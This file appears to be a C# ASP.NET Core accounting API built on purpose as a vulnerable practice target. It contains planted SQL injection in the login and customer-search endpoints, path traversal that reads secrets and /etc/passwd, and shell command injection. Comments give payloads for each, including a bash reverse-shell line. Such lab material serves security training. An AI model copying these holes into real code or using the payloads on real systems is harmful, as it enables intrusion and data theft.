// NetLedger — accounting API. DELIBERATELY VULNERABLE practice target.
// Medium tier, webapp set. Stack: ASP.NET Core 8 minimal API + Postgres (Npgsql).
// Vectors: A (SQL injection), D (path-traversal exfiltration), J (command-injection RCE).
//
// Nothing here is safe by accident. Every "VULN" comment marks a planted sink.

using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;
using Npgsql;

var builder = WebApplication.CreateBuilder(args);

// appsettings.Secrets.json is deployed next to the binary (/app). It holds the
// leaked secrets (DB connection string, API key, the admin diagnostics token)
// and is ALSO the file the path-traversal download endpoint exfiltrates.
builder.Configuration.AddJsonFile("appsettings.Secrets.json", optional: false, reloadOnChange: false);

var app = builder.Build();

var config = app.Configuration;

// Connection string comes from the environment in compose
// (ConnectionStrings__Default); appsettings.Secrets.json carries a copy too.
string ConnString() =>
    config.GetConnectionString("Default")
    ?? "Host=db;Port=5432;Database=netledger;Username=netledger;Password=netledger-db-pw-2024";

// ---- trivial opaque session tokens (issued by /api/login) -------------------
// Not cryptographic; just enough to gate the customer book behind "a login".
var sessions = new System.Collections.Concurrent.ConcurrentDictionary<string, string>(); // token -> role

static string Md5Hex(string s)
{
    var bytes = MD5.HashData(Encoding.UTF8.GetBytes(s));
    var sb = new StringBuilder(bytes.Length * 2);
    foreach (var b in bytes) sb.Append(b.ToString("x2"));
    return sb.ToString();
}

// =============================================================================
// Surface
// =============================================================================

app.MapGet("/", () => Results.Content(
    """
    <!doctype html>
    <html lang="en"><head><meta charset="utf-8"><title>NetLedger</title></head>
    <body>
      <h1>NetLedger</h1>
      <p>Internal accounting API &mdash; customer ledgers, balances and billing reports.</p>
      <ul>
        <li><code>POST /api/login</code> &mdash; accountant sign-in</li>
        <li><code>GET  /api/customers?q=</code> &mdash; search the customer book (auth required)</li>
        <li><code>GET  /api/reports/download?file=</code> &mdash; download a billing report</li>
        <li><code>GET  /api/info</code> &mdash; build info</li>
      </ul>
    </body></html>
    """, "text/html"));

// Healthcheck: proves the process is up AND the database answers.
app.MapGet("/health", async () =>
{
    try
    {
        await using var conn = new NpgsqlConnection(ConnString());
        await conn.OpenAsync();
        await using var cmd = new NpgsqlCommand("SELECT 1", conn);
        await cmd.ExecuteScalarAsync();
        return Results.Text("ok");
    }
    catch
    {
        return Results.Text("db unavailable", "text/plain", statusCode: 503);
    }
});

app.MapGet("/api/info", () => Results.Json(new
{
    app = "NetLedger",
    version = "2.4.1",
    framework = "ASP.NET Core 8",
}));

// =============================================================================
// Vector A — SQL injection
// =============================================================================

// VULN (SQLi, auth bypass): the username is concatenated straight into the SQL
// string. The password is MD5'd, so the username field is the injection point:
//   {"username":"admin' -- ","password":"x"}
//   {"username":"' OR '1'='1' -- ","password":"x"}
app.MapPost("/api/login", async (LoginReq req) =>
{
    var pwHash = Md5Hex(req.Password ?? "");
    var sql = "SELECT id, username, role FROM users "
            + $"WHERE username = '{req.Username}' AND password_md5 = '{pwHash}'";

    await using var conn = new NpgsqlConnection(ConnString());
    await conn.OpenAsync();
    await using var cmd = new NpgsqlCommand(sql, conn);
    try
    {
        await using var r = await cmd.ExecuteReaderAsync();
        if (await r.ReadAsync())
        {
            var username = r.GetString(1);
            var role = r.GetString(2);
            var token = Guid.NewGuid().ToString("N");
            sessions[token] = role;
            return Results.Json(new { token, username, role });
        }
    }
    catch (Exception ex)
    {
        // Verbose DB errors leak the backend and help blind/union SQLi tuning.
        return Results.Json(new { error = "query failed", detail = ex.Message }, statusCode: 400);
    }
    return Results.Json(new { error = "invalid credentials" }, statusCode: 401);
});

// VULN (SQLi, data dump): the search term is concatenated into the WHERE clause,
// so this is UNION-/boolean-injectable (sqlmap-friendly). Requires any token
// issued by /api/login (reachable via the auth bypass above).
app.MapGet("/api/customers", async (HttpContext ctx) =>
{
    var auth = ctx.Request.Headers.Authorization.ToString();
    var token = auth.StartsWith("Bearer ", StringComparison.OrdinalIgnoreCase)
        ? auth["Bearer ".Length..].Trim()
        : auth.Trim();
    if (string.IsNullOrEmpty(token) || !sessions.ContainsKey(token))
        return Results.Json(new { error = "missing or invalid token" }, statusCode: 401);

    var q = ctx.Request.Query["q"].ToString();
    var sql = "SELECT id, name, email, phone, card_last4, balance FROM customers "
            + $"WHERE name ILIKE '%{q}%' OR email ILIKE '%{q}%' ORDER BY id";

    await using var conn = new NpgsqlConnection(ConnString());
    await conn.OpenAsync();
    await using var cmd = new NpgsqlCommand(sql, conn);
    try
    {
        await using var r = await cmd.ExecuteReaderAsync();
        var rows = new List<object>();
        while (await r.ReadAsync())
        {
            rows.Add(new
            {
                id = r.GetValue(0),
                name = r.GetValue(1),
                email = r.GetValue(2),
                phone = r.GetValue(3),
                card_last4 = r.GetValue(4),
                balance = r.GetValue(5),
            });
        }
        return Results.Json(rows);
    }
    catch (Exception ex)
    {
        return Results.Json(new { error = "query failed", detail = ex.Message }, statusCode: 400);
    }
});

// =============================================================================
// Vector D — path-traversal exfiltration
// =============================================================================

// VULN (path traversal): the caller-supplied name is Path.Combine'd onto the
// reports directory with NO normalisation or containment check, then the bytes
// are returned verbatim. "../appsettings.Secrets.json" climbs to /app and leaks
// the secrets file; "../../../etc/passwd" escapes the container root.
var reportsDir = Path.Combine(Directory.GetCurrentDirectory(), "reports"); // /app/reports
app.MapGet("/api/reports/download", (string? file) =>
{
    if (string.IsNullOrEmpty(file))
        return Results.Json(new { error = "file query parameter required" }, statusCode: 400);

    var target = Path.Combine(reportsDir, file); // no containment check
    try
    {
        var bytes = File.ReadAllBytes(target);
        return Results.File(bytes, "application/octet-stream", Path.GetFileName(file));
    }
    catch
    {
        return Results.Json(new { error = "file not found" }, statusCode: 404);
    }
});

// =============================================================================
// Vector J — admin diagnostics → command-injection RCE
// =============================================================================

// Unlinked, guessable "admin diagnostics" endpoint. Gated by the X-Admin-Token
// header, whose value lives in appsettings.Secrets.json (recover it via vector D).
//
// VULN (command injection): the target is interpolated into a /bin/sh -c
// command line, so a shell metacharacter runs arbitrary commands:
//   {"target":"127.0.0.1; id"}
//   {"target":"x; bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"}   -> reverse shell
app.MapPost("/api/admin/diag", async (HttpContext ctx, DiagReq req) =>
{
    var adminToken = config["AdminToken"];
    var presented = ctx.Request.Headers["X-Admin-Token"].ToString();
    if (string.IsNullOrEmpty(adminToken) || presented != adminToken)
        return Results.Json(new { error = "forbidden" }, statusCode: 403);

    var psi = new ProcessStartInfo
    {
        FileName = "/bin/sh",
        RedirectStandardOutput = true,
        RedirectStandardError = true,
        UseShellExecute = false,
    };
    psi.ArgumentList.Add("-c");
    psi.ArgumentList.Add($"ping -c 1 {req.Target}"); // VULN: user-controlled, unescaped

    try
    {
        using var proc = Process.Start(psi)!;
        var stdout = await proc.StandardOutput.ReadToEndAsync();
        var stderr = await proc.StandardError.ReadToEndAsync();
        await proc.WaitForExitAsync();
        return Results.Text(stdout + stderr);
    }
    catch (Exception ex)
    {
        return Results.Json(new { error = "diagnostic failed", detail = ex.Message }, statusCode: 500);
    }
});

app.Run();

record LoginReq(string? Username, string? Password);
record DiagReq(string? Target);
